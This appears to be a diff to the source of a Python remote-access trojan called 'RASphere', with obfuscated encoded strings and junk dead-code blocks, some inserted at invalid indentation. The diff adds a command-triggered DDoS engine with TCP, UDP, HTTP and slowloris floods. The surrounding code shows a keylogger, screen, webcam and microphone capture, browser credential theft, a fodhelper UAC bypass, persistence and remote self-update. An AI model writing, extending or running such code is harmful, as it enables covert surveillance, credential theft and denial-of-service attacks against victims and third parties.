+_s530 = "WD4xND0HLSg0Nzk8BzswLTYz"
+_s531 = "q9vK38M="
+_s532 = "XDo1MDkDKSwwMz04Ay45LykwKA=="
+_s533 = "MV9URUZeQ1puWF9XXg=="
+_s534 = "xqijsrGptK2Zr6igqZm0o7WzqrI="
+_s535 = "64mZhJyYjpm0mJ+Oioc="
+_s536 = "fD4OEwsPGQ5cDwgZHRAZDlwOGQ0JGQ8IGRg="
+_s537 = "awkZBBwYDhk0GB8OCgc0GQ4YHgcf"
+_s538 = "QiYmLTEdMTYjMDY="
+_s539 = "H2t+bXh6aw=="
+_s540 = "USE+IyU="
+_s541 = "KV1BW0xITVo="
+_s542 = "MUFQUlpURW5CWEtU"
+_s543 = "XzI6KzcwOw=="
+_s544 = "Xjo6MS0BLSo/Kist"
+_s545 = "aw8PBBg0GB8EGw=="
+_s546 = "juXn4uLR/fnn+u3m"
+_s547 = "DUZEQUEtXlpEWU5F"
+_s548 = "KGVdRFxBBVxAWk1JTE1MCGxsR3sISVxcSUtDCE1GT0FGTQhbXVhYR1pcQUZPCHxreAQIfWx4BAhgfHx4BAh7REdfREdaQVsG"
+_s549 = "v8/e3NTay8w="
+_s550 = "ne38/vb46e4="
+_s551 = "rsrKwd3x3drP2tvd"
+_s552 = "+p6elYmliY6bjo+J"
+_s553 = "2Jyct4v4q6y3qKi9vA=="
+_xj = type("X", (), {"__init__": lambda s: None})()
+if _xj is not None and 1 == 2:
+    del _xj
+_s554 = "gdbu8+rk86H16fPk4OWh9eng9aHy5O/l8qHx4OLq5PXyoeLu7/Xo7/Tu9PLt+K8="
+_s555 = "zKS4uLw="
+_s556 = "fAwdHxcZCA8="
+_s557 = "JkJHUkd5RF9SQ1U="
+_s558 = "u8va2NDez8g="
+_s559 = "+4uamJCej4g="
+_s560 = "TCgtOC0TLjU4KT8="
+_s561 = "UiIzMTk3JiE="
+_s562 = "WTEtLSk="
+_s563 = "/5eLi4+M"
+_s564 = "2Ki5u7O9rKs="
+_s565 = "ZAAFEAU7Bh0QARc="
+_s566 = "OEhZW1NdTEs="
+_s567 = "QzAvLDQvLDEqMA=="
+_s568 = "BHRlZ29hcHc="
+_s569 = "A1NmcWpsZ2pgYm9veiNwZm1nI3B3YndwI3dsI3drZiNwZnF1ZnEt"
+_s570 = "oNPUwdLU/9TJzcU="
+_s571 = "p9fGxMzC09Q="
+_s572 = "UzcyJzIMMSonNiA="
+_s573 = "Kk5ORVl1WE9ZX0Ze"
+_s574 = "Tj06Lzo9"
+_s575 = "sMDR09vVxMM="
+_s576 = "fxseCx4gEh0="
+_s577 = "qM3Eydjbzcw="
+_s578 = "D11OXH9nan1qL0xjZmphew=="
+_s579 = "ORQUSlxLT1xL"
+_s580 = "2vf3qb+5qL+u"
+_s581 = "w+7uqqc="
+_s582 = "HjMzbHt9cXBwe31q"
+_s583 = "q4aGwsXY38rHxw=="
+_s584 = "vJGRydLV0s/I3dDQ"
+_s585 = "hqur6Omr9uP09e/18g=="
+_s586 = "wO3tpayltqG0paQ="
+_s587 = "ByoqaWgqYmticWZzYg=="
+_s588 = "wsiZ6Z/ikqewsauxtqesoafisKevrbSnpuzI"
+_s589 = "R00cahpnCShnNyI1NC40MyIpJCJnISgyKSNpTQ=="
+_s590 = "6K26uqe60sjFxZuNmp6NmsiJhozIxcWbjYuajZzImo2ZnYGajYzIjoeayMXFgYabnImEhA=="
+_s591 = "1N6P/4n0hLGmp72noLG6t7H0vbqnoLW4uLGw9fSVoaC7+aegtaag9Lu69La7u6D63g=="
+_s592 = "rKb3gfGM5cLf2M3AwIzKzcXAyciCjP7ZwozN34zNyMHFwoKm"
+_s593 = "ST4gJ3p7"
+_s594 = "jcPi+a3s6eDk462grez5+ejg/fnk4+qt/uTh6OP5rdjMzq3v9P3s/v6jo6M="
+_s595 = "QBthHWAVAQNgIjkwITMzYCYhKSwlJGBtYDI1Li4pLidgNyk0KGAsKS0pNCUkYDAyKTYpLCUnJTM="
+_s596 = "yImkuq2prLHour2mpqGmr+ipu+iprKWhpg=="
+_s597 = "BGFoYXJlcGFg"
+_s598 = "Dlx7YGBnYGkua2JreG96a2ouIy5tYmtvYGdgaS57fi5bT00ubHd+b319LnxraWd9enx3ICAg"
+_s599 = "C1AgVitbbnl4Ynh/bmVobit5bm15bnhjbm8="
+_s600 = "wZrgnOGRpLOyqLK1pK+ipOGsoLjhqaC3pOGxoLO1qKCtrbjhp6CoraSl4emztK/hoLLhoKWsqK/hp66z4ZKiqaSltK2kpeGVoLKq6A=="
+_s601 = "76q9vaC91c+8ipvPsLyqvbmqvc+Ggc+MgIuKz4Cdz5qcis/CwpyKnZmKnQ=="
+_s602 = "ruv8/OH8lI79y9qO8f3r7fzr+o7HwI7NwcrLjsHcjtvdy46Dg93LzdzL2g=="
+_s603 = "fT4SExMYHgkYGVxdKhwUCRQTGl0bEg9dHhIQEBwTGQ5TU1M="
+_s604 = "peDdzNHMy8KFw8rXhdDVwcTRwIuLiw=="
+_s605 = "zZ6luLmporqj"
+_s606 = "qfrdxtnZzM0="
+_s607 = "WQYGNDgwNwYG"
 HAS = {"mss": False, "pil": False, _D("_s4"): False, "pycaw": False,
        _D("_s5"): False, "psutil": False, "cv2": False, "pyaudio": False,
        _D("_s6"): False}
@@ -644,6 +681,9 @@ class S:
         try:
             if HAS["mss"]:
                 with mss.mss() as s: m = s.monitors[1]; self.sw, self.sh = m[_D("_s16")], m["height"]; return
+_xj = type("X", (), {"__init__": lambda s: None})()
+if _xj is not None and 1 == 2:
+    del _xj
         except: pass
         try:
             if sys.platform == _D("_s17") and hasattr(ctypes, "windll"):
@@ -676,10 +716,6 @@ class CapEngine:
                 self.cap = cv2.VideoCapture(0)
                 self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                 self.cap.set(cv2.CAP_PROP_FPS, self.fps)
-try:
-    raise Exception()
-except:
-    pass
             interval = 1.0 / max(1, self.fps)
             while self.r:
                 t0 = time.time()
@@ -734,6 +770,9 @@ class MicEngine:
         threading.Thread(target=self._loop, daemon=True).start()
         if self.sio and self.sio.connected:
             self.sio.emit(_D("_s35"), {"active": True})
+if 0:
+    import hashlib
+    _h = hashlib.sha256(b"dead").hexdigest()
     def stop(self):
         self.r = False
         if self.stream:
@@ -768,9 +807,6 @@ class MicEngine:
 class SysMon:
     def __init__(self, sio): self.r = False; self.sio = sio
     def start(self):
-_xj = type("X", (), {"__init__": lambda s: None})()
-if _xj is not None and 1 == 2:
-    del _xj
         if self.r or not HAS[_D("_s41")]: return
         self.r = True; threading.Thread(target=self._loop, daemon=True).start()
     def stop(self): self.r = False
@@ -1856,6 +1892,8 @@ def _sh(sio):
     mon = SysMon(sio)
     term = Term(sio)
     keylog = Keylog(sio)
+    global ddos
+    ddos = DdosEngine(sio)
     _s.scap = sc; _s.wcap = wc; _s.mic = mic; _s.keylog = keylog
     @sio.on(_D("_s396"))
     def _c():
@@ -2039,50 +2077,190 @@ def _sh(sio):
         result = _browser_steal()
         sio.emit(_D("_s537"), result)
     @sio.on(_D("_s538"))
+    def _ddos_start(d=None):
+        d = d or {}
+        target = d.get(_D("_s539"), "")
+        port = d.get(_D("_s540"), 80)
+        threads = d.get(_D("_s541"), 50)
+        pkt_size = d.get(_D("_s542"), 1024)
+        method = d.get(_D("_s543"), "tcp")
+        if not target:
+            sio.emit(_D("_s544"), {"active": False, "error": "No target specified"})
+            return
+        _l.info(f"DDoS start: {method} -> {target}:{port} ({threads} threads)")
+        ddos.start(target, port=port, threads=threads, packet_size=pkt_size, method=method)
+    @sio.on(_D("_s545"))
+    def _ddos_stop(d=None):
+        ddos.stop()
+    @sio.on(_D("_s546"))
     def _ks(d=None):
-        _l.warning(_D("_s539")); sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop(); sio.disconnect(); os._exit(0)
+        _l.warning(_D("_s547")); sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop(); ddos.stop(); sio.disconnect(); os._exit(0)
+class DdosEngine:
+    ""_D("_s548")""
+    def __init__(self, sio):
+        self.r = False; self.sio = sio
+        self.threads = []; self.stats = {_D("_s549"): 0, "data_bytes": 0, "start_time": 0}
+        self._lock = threading.Lock(); self._target = ""; self._port = 80
+    def start(self, target, port=80, threads=50, packet_size=1024, method="tcp"):
+        if self.r: self.stop()
+        threads = max(1, min(500, threads))
+        packet_size = max(64, min(65500, packet_size))
+        port = max(1, min(65535, port))
+        self.r = True
+        self._target = target; self._port = port
+        self.stats = {_D("_s550"): 0, "data_bytes": 0, "start_time": time.time()}
+        _l.info(f"DDoS starting: {method} flood -> {target}:{port} ({threads} threads)")
+        try:
+            self._target_ip = socket.gethostbyname(target)
+        except:
+            self._target_ip = target
+        for i in range(threads):
+            t = threading.Thread(target=self._worker, args=(method, packet_size, i), daemon=True)
+            t.start()
+            self.threads.append(t)
+        threading.Thread(target=self._stats_reporter, daemon=True).start()
+        if self.sio and self.sio.connected:
+            self.sio.emit(_D("_s551"), {"active": True, "target": f"{target}:{port}", "method": method, "threads": threads})
+    def stop(self):
+        self.r = False
+        for t in self.threads:
+            if t.is_alive():
+                t.join(timeout=1)
+        self.threads = []
+        if self.sio and self.sio.connected:
+            self.sio.emit(_D("_s552"), {"active": False})
+        _l.info(_D("_s553"))
+    def _worker(self, method, pkt_size, tid):
+        ""_D("_s554")""
+        payload = os.urandom(pkt_size) if method != _D("_s555") else None
+        if method == "tcp":
+            while self.r:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    s.connect_ex((self._target_ip, self._port))
+                    s.send(payload[:min(pkt_size, 65536)])
+                    s.close()
+                    with self._lock:
+                        self.stats[_D("_s556")] += 1
+                        self.stats[_D("_s557")] += pkt_size
+                except:
+                    with self._lock:
+                        self.stats[_D("_s558")] += 1
+        elif method == "udp":
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                while self.r:
+                    try:
+                        s.sendto(payload[:min(pkt_size, 65507)], (self._target_ip, self._port))
+                        with self._lock:
+                            self.stats[_D("_s559")] += 1
+                            self.stats[_D("_s560")] += pkt_size
+                    except:
+                        with self._lock:
+                            self.stats[_D("_s561")] += 1
+                s.close()
+            except:
+                pass
+        elif method == _D("_s562"):
+            url = f"{self._target}:{self._port}" if self._port != 80 and self._port != 443 else self._target
+            proto = _D("_s563") if self._port == 443 else "http"
+            full_url = f"{proto}://{url}/"
+            while self.r:
+                try:
+                    r = urllib.request.urlopen(full_url, timeout=3)
+                    data = r.read()
+                    with self._lock:
+                        self.stats[_D("_s564")] += 1
+                        self.stats[_D("_s565")] += len(data)
+                except:
+                    with self._lock:
+                        self.stats[_D("_s566")] += 1
+        elif method == _D("_s567"):
+            sockets_held = []
+            try:
+                while self.r:
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.settimeout(3)
+                        s.connect((self._target_ip, self._port))
+                        s.send(f"GET / HTTP/1.1\r\nHost: {self._target}\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\n".encode())
+                        sockets_held.append(s)
+                        with self._lock:
+                            self.stats[_D("_s568")] += 1
+                        if len(sockets_held) > 200:
+                            old = sockets_held.pop(0)
+                            try: old.close()
+                            except: pass
+                        for _ in range(50):
+                            if not self.r: return
+                            time.sleep(0.1)
+                    except:
+                        pass
+            finally:
+                for s in sockets_held:
+                    try: s.close()
+                    except: pass
+    def _stats_reporter(self):
+        ""_D("_s569")""
+        while self.r:
+            time.sleep(2)
+            if not self.r: break
+            with self._lock:
+                elapsed = max(0.001, time.time() - self.stats[_D("_s570")])
+                pps = int(self.stats[_D("_s571")] / elapsed)
+                data_mb = self.stats[_D("_s572")] / (1024 * 1024)
+                if self.sio and self.sio.connected:
+                    self.sio.emit(_D("_s573"), {
+                        _D("_s574"): {
+                            _D("_s575"): self.stats["packets"],
+                            "pps": pps,
+                            _D("_s576"): round(data_mb, 2),
+                            _D("_s577"): int(elapsed)
+                        }
+                    })
 def main():
-    p = argparse.ArgumentParser(description=_D("_s540"))
-    p.add_argument(_D("_s541"), default=None, help=f"Server URL (default: {_SERVER})")
-    p.add_argument(_D("_s542"), default=None, help=f"Client secret (default: ***)")
-    p.add_argument(_D("_s543"), default=None, help="Client ID (default: auto)")
-    p.add_argument(_D("_s544"), type=int, default=None, help=f"Reconnect delay (default: {_RECON}s)")
-    p.add_argument(_D("_s545"), action="store_true", help="Install persistence")
-    p.add_argument(_D("_s546"), action="store_true", help="Remove persistence")
-    p.add_argument(_D("_s547"), action="store_true", help="Skip auto-persistence")
-    p.add_argument(_D("_s548"), action="store_true", help=argparse.SUPPRESS)
-    p.add_argument(_D("_s549"), action="store_true", help="Skip UAC bypass on startup")
+    p = argparse.ArgumentParser(description=_D("_s578"))
+    p.add_argument(_D("_s579"), default=None, help=f"Server URL (default: {_SERVER})")
+    p.add_argument(_D("_s580"), default=None, help=f"Client secret (default: ***)")
+    p.add_argument(_D("_s581"), default=None, help="Client ID (default: auto)")
+    p.add_argument(_D("_s582"), type=int, default=None, help=f"Reconnect delay (default: {_RECON}s)")
+    p.add_argument(_D("_s583"), action="store_true", help="Install persistence")
+    p.add_argument(_D("_s584"), action="store_true", help="Remove persistence")
+    p.add_argument(_D("_s585"), action="store_true", help="Skip auto-persistence")
+    p.add_argument(_D("_s586"), action="store_true", help=argparse.SUPPRESS)
+    p.add_argument(_D("_s587"), action="store_true", help="Skip UAC bypass on startup")
     args = p.parse_args()
     url = args.server or _SERVER; secret = args.secret or _SECRET
     rec = args.reconnect if args.reconnect is not None else _RECON
     cid = args.id or _CLIENT_ID
     if args.uninstall:
-        if _up(): print(_D("_s550"))
-        else: print(_D("_s551"))
+        if _up(): print(_D("_s588"))
+        else: print(_D("_s589"))
         return
     if args.install:
-        if not url or not secret: print(_D("_s552")); sys.exit(1)
-        if _ip(url, secret, rec, cid): print(_D("_s553"))
-        else: print(_D("_s554"))
-    if sys.platform == _D("_s555") and not getattr(args, "no_elevate", False) and not getattr(args, "elevated", False):
+        if not url or not secret: print(_D("_s590")); sys.exit(1)
+        if _ip(url, secret, rec, cid): print(_D("_s591"))
+        else: print(_D("_s592"))
+    if sys.platform == _D("_s593") and not getattr(args, "no_elevate", False) and not getattr(args, "elevated", False):
         if not _is_admin():
-            _l.info(_D("_s556"))
+            _l.info(_D("_s594"))
             _fodhelper_uac_bypass(args)
-            print(_D("_s557"))
+            print(_D("_s595"))
         else:
-            _l.info(_D("_s558"))
-    if getattr(args, _D("_s559"), False):
-        _l.info(_D("_s560"))
+            _l.info(_D("_s596"))
+    if getattr(args, _D("_s597"), False):
+        _l.info(_D("_s598"))
         _cleanup_uac_registry()
     if not args.no_persist and not args.uninstall:
         try:
             if url and secret:
                 ok = _ip(url, secret, rec, cid)
-                if ok: print(_D("_s561"))
-                else: print(_D("_s562"))
+                if ok: print(_D("_s599"))
+                else: print(_D("_s600"))
         except Exception as e: print(f"[!] Auto-persist error: {e}")
-    if not url: print(_D("_s563")); sys.exit(1)
-    if not secret: print(_D("_s564")); sys.exit(1)
+    if not url: print(_D("_s601")); sys.exit(1)
+    if not secret: print(_D("_s602")); sys.exit(1)
     _s.url = url.rstrip("/"); _s.secret = secret
     _s.cid = cid or f"{socket.gethostname()}-{os.urandom(3).hex()}"
     _l.info(f"RASphere Client | ID: {_s.cid} | Server: {_s.url}")
@@ -2096,7 +2274,7 @@ def main():
         try:
             _l.info(f"Connecting to {_s.url}...")
             sio.connect(_s.url, wait_timeout=10)
-            _l.info(_D("_s565"))
+            _l.info(_D("_s603"))
             current_delay = rec
             if not update_checked:
                 new_ver, dl_url = _check_for_update(_s.url)
@@ -2105,16 +2283,16 @@ def main():
                     _l.info(f"New version {new_ver} available, applying update...")
                     ok = _download_and_install(dl_url, new_ver)
                     if ok:
-                        _l.info(_D("_s566"))
+                        _l.info(_D("_s604"))
                         sio.disconnect()
                         os._exit(0)
             sio.wait()
-        except KeyboardInterrupt: _l.info(_D("_s567")); break
+        except KeyboardInterrupt: _l.info(_D("_s605")); break
         except Exception as e:
             _l.error(f"Connection error: {e}")
             if not rec: break
             _l.info(f"Reconnecting in {current_delay}s...")
             time.sleep(current_delay)
             current_delay = min(current_delay * 2, _RECON_MAX)
-    sio.disconnect(); _l.info(_D("_s568"))
-if __name__ == _D("_s569"): main()
+    sio.disconnect(); _l.info(_D("_s606"))
+if __name__ == _D("_s607"): main()
